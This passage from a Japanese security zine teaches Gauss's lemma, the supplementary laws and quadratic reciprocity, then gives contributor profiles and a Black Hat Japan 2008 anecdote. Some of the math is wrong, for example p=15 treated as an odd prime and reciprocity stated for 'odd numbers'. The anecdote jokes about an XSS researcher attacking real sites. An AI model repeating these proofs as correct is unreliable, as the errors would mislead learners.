+4, 3, 1, 5, 2		←1,2,3,4,5が1通り現れている。
+
+　このとき、ルジャンドル記号(a/p)を計算する。
+
+(a/p)
+=(7/11)
+=7^{(11-1)/2}
+=7^5
+≡-1 mod 11
+
+　一方、(-1)^(絶対値最小剰余の中の負の数の個数)を計算する。負の数の個数は
+3個なので、(-1)^3=-1になる。この値-1は(a/p)の値と一致している。
+
+　以上はp=11,a=7の場合の議論であったが、一般の場合でも成り立つ。これをガ
+ウスの補題という。
+
+[定理]ガウスの補題
+p：奇素数、r=(p-1)/2、(a,p)=1とする。
+このとき、aのr倍までの倍数を並べる。
+1a, 2a, …, ra
+これらのmod pの絶対値最小剰余をa1, a2, …, a_rとする。
+この数列の中の負数の個数をtとすれば、(a/p)=(-1)^tである。
+
+　上記の表記では絶対値最小剰余という言葉を使っているが、数列1a, 2a, …, 
+raをpで割った余りの中でp/2より大きい数の個数がtと言い換えることもできる。
+
+　このガウスの補題について、数直線上で考えてみる。
+
+http://s-akademeia.sakura.ne.jp/main/image9/gauss_hodai.jpg
+
+　xは1から(p-1)/2までのいずれかの数とする。これをa倍して、mod pを取れば範
+囲Aか範囲Bに含まれる。このうち、範囲Bに含まれる個数をtとすると、pを法とす
+るaの平方剰余、即ち(a/p)はtの偶奇に依存するということである。
+
+[証明](a,p)=1のとき、aの(p-1)/2個（=rとおく）の倍数を作る。
+
+1a, 2a, …, ra		←(*)	（aは添え字ではない。1a＝1×a）
+
+　そして、絶対最小剰余を
+
+a1, a2, …, a_r		←(**)　（1,2,…,rは添え字）
+
+とする。
+
+　(**)の”絶対値”はすべてmod pで異なる。これを示す。
+
+(i)ai=aj（1≦i,j≦r、i≠j）と仮定する。
+
+ai≡aj (mod p)
+a(i-j)≡0 (mod p)
+i≡j (mod p)　（∵(a,p)=1よりaで両辺を割った）
+仮定と矛盾。
+
+(ii)次に、ai=-aj（1≦i,j≦r、i≠j）と仮定する。
+
+ai≡-aj (mod p)
+a(i+j)≡0 (mod p)
+i+j≡0 (mod p)　（∵(a,p)=1よりaで両辺を割った）
+一方、r=(p-1)/2であったので、i+j=2rであったとしてもせいぜいp-1と一致。
+よって、i+j≦p-1であり、i+j＜pになる。
+i+j≡0 (mod p)とi+j＜pは明らかに矛盾。
+
+　以上の(i)(ii)より、(**)の”絶対値”はすべてmod pで異なることがわかる。
+
+　次に、(**)の数列における符号を無視すると、1,2,…,rが1通り現れる。これを
+示す。
+
+　(**)の中の負数の個数をtとすると、a1×a2×…×a_r=(-1)^t・r!　←(***)が成り立つ。
+
+　また、(*)より、(1a)(2a)…(ra)=a^r・r!　←(****)が成り立つ。
+
+　mod pで(***)と(****)は合同なので、次が成り立つ（右辺に注目した）。
+
+(-1)^t・r!≡a^r・r! (mod p)
+(-1)^t≡a^r　（∵(r!,p)=1より、両辺からr!を割った）
+(-1)^t≡a^((p-1)/2)　（∵r=(p-1)/2）
+(-1)^t≡(a/p)　（∵オイラー規準）　□
+
+
+■0x03.) 補充法則
+
+　合成数nに対する(n/p)を求めるときは、ルジャンドル記号は乗法性を持つので、
+nを素因数分解すればよい。そうすれば、(n/p)は(-1/p) or (2/p) or (奇素数/p)
+の積に帰着される。つまり、(-1/p) or (2/p) or (奇素数/p)が1か-1か判定する
+道具（定理）が必要である。
+
+[定理]第1補充法則
+p：奇素数とする。
+(-1/p)=(-1)^{(p-1)/2}
+
+[証明]オイラー規準である(a/p)=a^{(p-1)/2}に、a=-1を代入。　□
+
+[別証]ガウスの補題でa=-1として、aの倍数を並べる。
+
+-1,-2,…,-r
+
+　これらはすべて絶対値最小剰余になっているので、
+
+(-1/p)=(-1)^t　∧　t=(p-1)/2　□
+
+[系]
+(-1/p)=1 　（p≡1 (mod 4)のとき）
+　　　 -1　（p≡3 (mod 4)のとき）
+
+[証明]mが奇数のとき、4を法とするとm=4n±1の2パターンになる。
+
+・「m=4n+1」⇔「(m-1)/2=2n」⇔「(m-1)/2：偶数」
+・「m=4n-1」⇔「(m-1)/2=2n-1」⇔「(m-1)/2：奇数」
+
+　p≡1 (mod 4)のとき、(p-1)/2=偶数より、(-1)^{(p-1)/2}はいつも1になる。
+　一方、p≡3 (mod 4)のとき、(p-1)/2=奇数より、(-1)^{(p-1)/2}はいつも-1に
+なる。　□
+
+[定理]第2補充法則
+p：奇素数とする。
+(2/p)=(-1)^{(p^2-1)/8}
+
+　この第2補充法則により、例えば(2/13)を容易に解くことができる。
+
+　p=13のときであり、(p^2-1)/8=(169-1)/8=168/8=21=奇数
+
+　よって、(2/13)=(-1)^(奇数)=-1になる。
+
+[証明]a=2としてガウスの補題を適用する。
+
+　p-1は偶数なので、p-1は2で割れる。
+　その結果のr=(p-1)/2の偶奇によって、場合分けをする。ここでは直観的に理解
+できるようにpを具体的な値で観察してみる。
+
+[1]rが偶数のとき
+
+・例えば、p=13（8を法としてとき5）とすると、p/2=6.5、r=(p-1)/2=6＝偶数と
+なり、1から6までの数の倍数の数列を作る。
+
+a×1, a×2, a×3, a×4, a×5, a×6	←6個の数で構成される。
+
+↓a=2
+
+2×1, 2×2, 2×3, 2×4, 2×5, 2×6
+
+↓
+
+2, 4, 6, 8, 10, 12
+
+　この数列の中で、p/2=6.5より大きいものの個数はt=3個（=r/2=(p-1)/4）であ
+る。
+
+・例えば、p=17（8を法としてとき1）とすると、p/2=8.5、r=8＝偶数となり、1か
+ら8までの数の倍数の数列を作る。
+
+a×1, a×2, a×3, a×4, a×5, a×6, a×7, a×8	←8個の数で構成される。
+
+↓a=2
+
+2×1, 2×2, 2×3, 2×4, 2×5, 2×6, 2×7, 2×8
+
+↓
+
+2, 4, 6, 8, 10, 12, 14, 16
+
+　この数列の中で、p/2=8.5より大きいものの個数はt=4個（=r/2=(p-1)/4）であ
+る。
+
+[2]rが奇数のとき
+
+・例えば、p=15（8を法としてとき7）とすると、p/2=7.5、r=7＝奇数となり、1か
+ら7までの数の倍数の数列を作る。
+
+a×1, a×2, a×3, a×4, a×5, a×6, a×7	←7個の数で構成される。
+
+↓a=2
+
+2×1, 2×2, 2×3, 2×4, 2×5, 2×6, 2×7
+
+↓
+
+2, 4, 6, 8, 10, 12, 14
+
+　この数列の中で、p/2=7.5より大きいものの個数はt=4個（=(r+1)/2=(p+1)/4）
+である。
+
+・例えば、p=19（8を法としてとき3）とすると、p/2=9.5、r=(p-1)/2=9＝奇数と
+なり、1から9までの数の倍数の数列を作る。
+
+a×1, a×2, a×3, a×4, a×5, a×6, a×7, a×8, a×9	←9個の数で構成される。
+
+↓a=2
+
+2×1, 2×2, 2×3, 2×4, 2×5, 2×6, 2×7, 2×8, 2×9
+
+↓
+
+2, 4, 6, 8, 10, 12, 14, 16, 18
+
+　この数列の中で、p/2=9.5より大きいものの個数はt=5個（=(r+1)/2=(p+1)/4）
+である。
+　以上の議論は一般に成立するから、次が成り立つ。
+
+[1]「(p-1)/2：偶数」⇒「(p+1)/2：奇数」のとき、t1=(p-1)/4
+[2]「(p-1)/2：奇数」のとき、t2=(p+1)/4
+
+　このとき、次のような式を考える。
+
+[1]{(p+1)/2}×t1=(p^2-1)/8
+[2]{(p-1)/2}×t2=(p^2-1)/8
+   ~~~~~~~~~
+     奇数
+
+　これらの2つの式の偶奇はt1 or t2の偶奇に依存する。なぜならば、奇数×偶数
+＝偶数、奇数×奇数＝奇数であるから。
+
+　ゆえに、(p^2-1)/8は主張の式における右辺の(-1)の累乗に対応する。　□
+
+[系](2/p)=1   （p≡1 or 7 (mod 8)のとき）
+　　　　 = -1 （p≡3 or 5 (mod 8)のとき）
+
+[証明]8を法とすると、奇数はm=8n±1 or 8n±5（z∈Z）の4パターンだけでなる。
+
+・m=8n±1のとき、(m^2-1)/8=8n^2±2n＝偶数
+・m=8n±5のとき、(m^2-1)/8=8n^2±10n+3＝奇数
+
+　ところで、第2補充法則の(2/p)=(-1)^{(p^2-1)/8}が1か-1かは、(p^2-1)/8の偶
+奇に依存する。pは奇素数、mが奇数なので、(p^2-1)/8の偶奇は(m^2-1)/8の偶奇
+と一致する。　□
+
+　この系の便利さを実感してみる。第2補充法則で(2/13)を計算するときは、13^2
+の計算が必要であった。ところが、この系を使えばp=13≡5 (mod 8)より、すぐに
+(2/13)=-1とわかる。
+
+
+■0x04.) 相互法則
+
+　残りは(奇素数/p)を調べる術のみである。これは（平方剰余の）相互法則と呼
+ばれる定理を用いることで実現できる。この相互法則は整数論のひとつの山場と
+言われており、相互法則を出発点として近代の整数論が展開された。
+
+　この相互法則はオイラーにより帰納的に示され、完全な証明はガウスによって
+与えられた。相互法則の証明はたくさん存在し、本1冊になっているほどである。
+ここでは格子点を利用する幾何的な証明を用いる。
+
+　それではまず相互法則の主張を紹介する。
+
+[定理]平方剰余の相互法則
+p,q：相異なる奇数
+(p/q)(q/p)=(-1)^{(p-1)/2}{(q-1)/2}
+
+これは次のようにも言い換えられる。
+
+(p/q)(q/p)=1　 （p≡1 ∨ q≡1 (mod 4))
+          =-1　（p≡3 ∧ q≡3 (mod 4))
+
+　証明に入る前に、この相互法則を使えばルジャンドル記号の計算が容易になる
+ことを確認する。
+
+(15/71)
+=(3/71)(5/71)　（∵15=3・5、乗法性）
+=-(71/3)・(71/5)
+　（∵相互法則＋「71,5：異なる素数、素数71≡3 (mod 4), 3≡3 (4)」より(3/71)=-(71/3)、「71,5：異なる素数、71≡3 (mod 4), 5≡1 (mod 4)」より(5/71)=(71/5)）
+=-(2/3)(1/5)　（∵71≡2 (mod 3)、71≡1 (mod 5)）
+=-(-1)・1　（∵第2補充法則の系）
+=1
+
+[証明]ガウスの補題(a/p)=(-1)^tにおいて、a=qとする。
+
+数列{1・q, 2・q, …, {(p-1)/2}q}
+
+x∈{1,2,…,(p-1)/2}とし、xq mod p＞p/2を満たすxの個数がtに対応する。
+よって、xの偶奇がわかれば十分である。
+
+「xq (mod p) ＞ p/2」
+⇔「（(q/p)xの分数部分）＞1/2」　←(*)
+（∵「xq mod p＞p/2」⇔「xq=ap+r (a∈Z,0≦a＜r) ∧ r＞p/2」⇔「r/p=(q/p)x-ap ∧ r/p＞1/2」より）
+
+ここで原点OとD(p/2,q/2)を通る直線（Y=(q/p)X）を、y軸の方向に1/2だけ平行移
+動した直線をEFとする。
+各Xにおいて直線Y=(q/p)Xに一番近い格子点は、Yの上か下にある。
+しかもその格子点は必ず(q/p)X-(1/2)と(q/p)X+(1/2)の間に存在する。
+
+http://security2600.sakura.ne.jp/main2/image4/sougo.jpg
+
+X=xを0～p/2まで走らせたときに、直線の上に存在する一番近い格子点の個数をt1
+とすると次が成り立つ。
+
+t1
+=（(*)を満たすxの個数）
+=#{x|x∈{1,2,…,(p-1)/2} ∧ xq (mod p) ＞ p/2}
+=□OEFD内の格子点の数
+
+同様にして、直線の下に存在する一番近い格子点の個数をt2とすると次が成り立
+つ。
+
+t2
+=#{y|y∈{1,2,…,(q-1)/2} ∧ yp (mod q) ＞ q/2}
+=□ODHG内の格子点の数
+
+t1+t2
+=□OEFD内の格子点の数＋□ODHG内の格子点の数
+=□OEFD内の格子点の数＋□ODHG内の格子点の数＋□DFBH内の格子点の数
+　（∵□DFBH内には必ず格子点が存在しない）
+=六角形OEFBHG
+=□OADC-△EFF'-△GHH'
+={(p-1)/2}{(q-1)/2}-2△EFF'
+	            ~~~~~~~
+                     偶数
+
+よって、次のように主張が成り立つ。
+
+(q/p)(p/q)
+=(-1)^(t1+t2)
+=(-1)^[{(p-1)/2}{(q-1)/2}-2△EFF']
+=(-1)^{(p-1)/2}{(q-1)/2}
+
+これで前半が証明された。
+
+次は後半を示す。六角形OEFBHGは点M((p+1)/4,(q+q)/4)で点対称である。
+
+[1](p+1)/4が整数∧(q+1)/4が整数、即ちp≡-1≡3 (mod 4)∧q≡3 (mod 4)のとき
+
+　中心点Mは格子点になるためt1+t2は奇数になる。よって、(q/p)(p/q)=-1
+
+[2]Mが格子点でなければ、t1+t2は偶数になる。よって、(q/p)(p/q)=1　□
+
+
+■0x05.) 最後に
+
+　前回と今回で平方剰余、ルジャンドル記号、ガウスの補助定理、補充法則、平
+方剰余の相互法則について駆け足で紹介した。特に平方剰余の相互法則は見た目
+にも美しい定理なので、興味がある人は数学書に参照してもらいたい。『平方剰
+余の相互法則―ガウスの全証明』（日本評論社）という本には、ガウスの7つの証
+明が紹介されている。
+
+http://www.nippyo.co.jp/book/1249.html（残念ながら絶版）
+
+　次回はルジャンドル記号の拡張バージョンであるヤコビ記号を定義する。簡単
+に紹介すると、ヤコビ記号においてもルジャンドル記号と同様に補充法則・相互
+法則が成り立ち、平方剰余の計算において分子の素因数分解が不要になるのであ
+る。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+ --- 第6章: お知らせ ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
+います。
+　扱う内容のテーマは広義での「under ground」です。例えばハッキングやセキ
+ュリティからピッキングなどと幅広い内容を考えています。また特殊な職業や趣
+味の解説などでも構いません。
+　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
+る範囲で構いません。気軽に声をかけてください。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
+
+http://wizardbible.org/wbQandA.html
+
+○Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第7章: 著者プロフィール ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■金床
+●Job: プログラマー
+●Web: http://guardian.jumperz.net/, http://www.jumperz.net/
+●Mail: anvil@jumperz.net
+●Comment:
+　本当はBlack Hat Japan 2008のレポートを書くつもりだったのですが、IPUロム
+がゴロゴロしていてWB44の募集が遅くなったためBHJ2008の記憶が消し飛びました。
+2ヶ月前のことは覚えてません。悪いのはすべてIPUロムです。悪いのはいつもIP
+Uロムです。FOX3!
+
+　ということでここで番外編BHJ2008レポートを簡単に書いておきます。というか
+筆者が関係者（BHスタッフやスピーカー）と知り合いになりすぎたせいで書いて
+よいことと書いちゃいけないことの区別を付けるのが非常に難しいです。…と悩
+むのも面倒くさいので以下にすべて列挙する。
+
+　今年は地球防衛軍司令と東亜UTF7ハカー連合XSS支部総裁が来ていた。総裁の攻
+撃手法は非常に優雅かつ特有なもので、彼はありがたいことに攻撃手法を以前か
+ら公にしてくれている。司令と筆者が談笑していると、「最近国内の有名サイト
+で総裁の手法による攻撃が観測されている」という。筆者は「それはきっと模倣
+犯でつね。彼は成果をコミュニティにフィードバックしていますから」と半分以
+上本気で答えたのだが、その後総裁が加わって3人で会話していると、その攻撃は
+総裁本人のものであることが発覚した。アフォかと。とにかく世界はボクたちが
+考えているよりも1024倍くらい狭いなぁと思わされたネタでした。しかも今年は
+二人ともスピ（ry
+
+　今年は非常にユニークな、とある人物と日程を共にすることができた。彼は名
+前の1文字目が「ホ」なので、ここではホさん（仮名）と呼んでおこう。ホさんに
+よると、JavaScriptは省略して「じゃばすく」と読むらしい。ちょｗｗｗｗｗｗ
+ｗｗｼﾞｬｳﾞｧｽｸｗｗｗｗｗｗｗ
+　またさらに、ﾌﾟﾛｸﾞﾗﾐﾝｸﾞ言語のひとつである「C++」は「しーたすたす」と読む
+らしい。ちょｗｗｗｗｱﾘｴﾅｽｗｗｗｗｼｰﾀｽﾀｽｗｗｗｗｗｗ
+
+　ホさんが普通に「いや、ふつうはｼｰﾀｽﾀｽでしょ」とか真顔でいっているので隣
+にいたｹﾝｼﾞ先生に「ｼｰﾌﾟﾗﾌﾟﾗだよね」と確認するとこちらも真顔で「いや、ｼｰﾀｽ
+ﾀｽですね」とか言われた。
+
+　BHJ後の飲み屋でホさんと盛り上がったのが、「プログラミング初心者はどの言
+語から入るべきか？」という問題。これについては筆者は自身の失敗経験を元に
+した持論があり、それは「X86のアセンブリからやるべき」というものだ。そして
+その後C言語、ｼｰﾀｽﾀｽ、JavaやRubyなどに上がっていけばよい。ちなみにコンパイ
+ラの「g++」は「ｼﾞｰﾀｽﾀｽ」と読むから間違えないように。
+
+　しかしこの点についてホさんに以下のツッコミをもらった。「アセンブリから
+入ると低レイヤー萌えになってしまい、その後Javaなどの上の層に行けなくなる
+からダメだ」というものだ。なるほど…それはあるかも。事実筆者の周りのアセ
+ンブラーたちは低レイヤー萌えーとか言ってるヤツばかりで、C言語から上は見え
+ないフリをしている。「何か手っ取り早くやりたいとき、何つかって自分用のツ
+ール書きますか？」「うーん、C」とか答える人が多いのである。なかなか興味深
+い問題である。
+
+　話題は変わって仮眠好き男。呑み会でも会場でもユニークな超ナイスガイだっ
+た。BHJの会場でセッションの間の時間に彼とDNS Rebindingなどを中心に雑談し
+ていると、話題が変わり「日本語特有のセキュリティ問題などはないのか？」と
+きいてきた。タイミングよく次のセッションがhsgw氏だったので「次にhasegawa
+が面白い話をするぜ。これは見た方がいいぜ」と煽ると「じゃぁ見てみる」との
+ことに。その後のhsgw氏のセッションは仮眠好き男にとっては知らないネタばか
+りだったようで、新しいネタが出るたびに声をあげて笑っていた。仮眠好きはhs
+gwさんのセッションの内容にかなりｲﾝｽﾊﾟｲｱされたらしく、その後夜の呑み会でも
+二人で肩を組んで奇声を発していた。ということで筆者ﾅﾆｹﾞにいい仕事したかも。
+ちなみに仮眠好きは「外国語のｾｯｼｮﾝを同時通訳で見たのは初めてだ」と言ってい
+た。
+
+　今年はｽﾋﾟｰｶｰとして二人ﾈｲｻﾝが来ていた。でかい方は去年もｽﾋﾟｰｶｰを務めた彼
+で、何度かﾒｰﾙのやりとりをしたりして知り合いになっていたため、今年は再会を
+祝ったりｳﾋｮﾋｮな話などをして盛り上がった。テクニカルな点では彼のセッション
+（正確には成果は彼を含む4人によるもののようだ）が一番面白かった。彼は言う
+までもなく超ナイスガイ。
+
+　小さい方のﾈｲｻﾝも超ナイスガイだ。打ち上げの飲み屋で何気なく隣になったの
+で、USのどこからきたんだ？ときくとフロリダのジャクソンビルだという。ちょ
+ｗｗ、そこリンプ（Limp Bizkit）の出身地じゃん！！！漏れリンプ超好きなんだ
+よね！とか話しかけると向こうもﾗｳﾄﾞﾐｭｰｼﾞｯｸ大好きと判明して怒濤の音楽トーク
+に突入。しまいには二人でメタリカの昔の曲のﾘﾌを歌い出したりして首まで振っ
+ていた。洋楽知ってるとﾒﾘｹﾝと盛り上がれて楽しい。彼はAV Tokyoにも参加して
+くれていた。「日本の言葉がわかればもっと楽しいんだろうなぁ」と言っていた。
+
+　MSから来たｽﾋﾟｰｶｰのブルースとはAV Tokyoの席で知り合いになった。日本は初
+めてだというので「何かﾁﾐから見て珍しく感じたり奇妙に見えたものは？」とき
+くと「遅い時間なのにスーツを着ている人間がいっぱいいる！」という。彼から
+すると残業して遅くまで働いているのがありえないらしい。漏れが「いや、日本
+人にとってｼｺﾞﾄは宗教なんだよね」というと「本当か！」と真顔で反応された(;´Д`)。
+　彼とは労働時間とかライフﾜｰｸスタイルについての議論が超盛り上がった。人間
+が一日に効率よく働くことができる時間は短いから、残業などさせるのは会社に
+とっても損失。ぜったい労働時間は短くすべきだよ！と主張していた。漏れは「ﾀ
+ﾉﾑからそれは（日本人の）彼らのボスに言ってくれよ」と反応しておいたｗ。彼
+の周りは5時上がりが常識らしい。うらやましい世界ですね。
+
+　今年は参加人数が去年に比べてやや少なかった気がする。来年はまた少し増え
+るとよいのですが…。
+●今年を振り返って・来年の抱負
+　今年の目標（秘密）は既に達成したので満足している。来年は少しコンピュー
+タ時間を減らしてそのぶん色々なこと（オトコの手料理とか）にチャレンジして
+みたいと思っている。あと箱○を買ってエースコンバット6をやる（5はこの間ク
+リアした。今はZeroで上からレーザー降ってきて焼かれる面ではまっているとこ
+ろ）。
+
+
+■はせがわようすけ
+●Job: 社内警備員
+●Web: http://utf-8.jp/
+●Mail: hasegawa@utf-8.jp
+●Comment:
+まったくテクニカルな話題でなくってごめんなさい。
+●来年の抱負
+とにかく英語の勉強!! 
+英語必須なイベントをいくつか通じたおかげで、機械翻訳を使うスキルだけは上
+達しました。英語→日本語は、Infoseek翻訳がなかなか賢いです。
+
+
+■理事長（Rudolph von Gartheimer）
+●Job:Der vollstreckende Vorsitzender des zentralen Exekutivkomitees
+●Web:http://www.gartheimer.com/
+●Mail:gartheimer@hotmail.com
+●Team（Group）：宗凶法人 愛連合
+●今年を振り返って・来年の抱負:
+　今年は海に行けなくて残念、サーバーを立ち上げて党員が増えたことが嬉しい
+です。
+　来年の抱負は、今度こそ市街制服（ぁ
+
+
+■Kenji Aiko
+●Job: engineer
+●Web: http://ruffnex.oc.to/kenji/
+●Mail: kenji@ruffnex.oc.to
+●Comment:
+　今回は楽しんで書かせていただきました(^^;。
+●今年を振り返って・来年の抱負:
+　本当にいろいろあった1年でしたが、振り返ってみると本当に楽しい1年でした。
+といっても、あくまでも「振り返ってみると」であって、当時の進行形の自分的
+には、そうとう辛かったり、泣きそうだったり、死にそうだったりしてたわけで
+すが…。でも、そういうのも含めて、良い思い出になったと今は思います。そう
+考えると、来年がどういう年になるかは分かりませんが、まぁそれなりに辛かっ
+たり、泣きそうになったり、死にそうになったりする感じでも、まぁいいかなぁ
+と思います。未来の自分から見て、楽しいかどうか、というのが何かをする上で
+一番大切なことなのかもしれません。
+
+
+■IPUSIRON
+●Job: プログラマー
+●Web: http://akademeia.info
+●Mail: ipusiron@gmail.com
+●Comment:
+　WB44のリリースが遅れてしまい著者・読者の皆様にご迷惑をおかけしました。
+申し訳ありませんでした。
+　WBが始まってもう5年も経ちます。最初の頃はPhrackに追いつくのはまだまだ
+先だと思っていましたが、もうそろそろ射程範囲に入ってきたと思っています。
+後2年＋αで追いつきそうですね。
+　新規の執筆者は随時募集していますので、奮ってご応募ください。完全な原稿
+ができない、書きたいけど何を書いたらよいのかわからないなど、悩んでいまし
+たら相談に乗りますので、気軽にメールください。宜しくお願いします。
+●今年を振り返って・来年の抱負:
+　これまではとりあえずコードを書いてみてデバッグ時のエラーで対応しようと
+いうアプローチをすることが多々ありましたが、これからは正常に動作すること
+を確信するようなコードを最初から書くように心がけたいです。
+　今年は数学をさぼってきたので、来年は数学をもう少し勉強しようと思います。
+
+
